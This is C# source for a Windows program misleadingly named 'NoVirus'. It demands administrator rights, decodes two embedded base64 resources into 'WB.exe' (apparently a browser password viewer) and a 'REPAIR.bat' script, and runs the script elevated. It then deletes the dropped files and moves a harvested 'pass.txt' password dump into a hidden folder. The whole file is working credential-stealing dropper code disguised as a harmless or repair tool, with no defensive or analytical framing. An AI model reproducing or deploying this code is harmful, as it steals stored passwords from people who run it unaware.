using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Security.Principal;
using System.Threading;

namespace NoVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeLibrary();
        }

        private void CreateWPV()
        {
            Stream stream = new MemoryStream(Properties.Resources.WB);
            StreamReader SR = new StreamReader(stream);
            string my = SR.ReadToEnd();
            byte[] enc = Convert.FromBase64String(my);
            File.WriteAllBytes("WB.exe", enc);
            SR.Close();
        }

        private void CreateBAT()
        {
            Stream stream = new MemoryStream(Properties.Resources.BAT);
            StreamReader SR = new StreamReader(stream);
            string my = SR.ReadToEnd();
            byte[] enc = Convert.FromBase64String(my);
            File.WriteAllBytes("REPAIR.bat", enc);
            SR.Close();
        }

        bool isAdmin;
        string path;
        private void InitializeLibrary()
        {
            path = Assembly.GetExecutingAssembly().Location; isAdmin = false;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (isAdmin)
            {
                try
                {
                    int last = path.LastIndexOf('\u005c') + 1;
                    path = path.Remove(last);
                    string bat = path + "REPAIR.bat";
                    string passview = path + "WB.exe";
                    if (File.Exists(bat) != true && File.Exists(passview) != true)
                    {
                        CreateBAT(); CreateWPV();
                        Process my = new Process();
                        my.StartInfo.FileName = $"{path}REPAIR.bat";
                        my.StartInfo.UseShellExecute = true;
                        my.StartInfo.Verb = "runas";
                        my.Start();
                        my.WaitForExit();
                    }
                }
                catch (Exception exc) { MessageBox.Show($"{exc.Message}!\n Please, run this program as administrator!", "Error!"); Close(); }
            }
            else { MessageBox.Show($"Please, run this program as administrator!", "Error!"); Close(); }
            Suicide();
        }

        private void Suicide()
        {
            if (isAdmin)
            {
                Thread.Sleep(1500);
                if (File.Exists($"{path}REPAIR.bat")) { File.Delete($"{path}REPAIR.bat"); }
                if (File.Exists($"{path}WB.exe")) { File.Delete($"{path}WB.exe"); }
                if (File.Exists($"{path}pass.txt"))
                {
                    if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", $"{path}my\\pass_old.txt"); }
                    else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                }
                else { Suicide(); }
                Close();
            }
            else { Close(); }
        }
    }
}
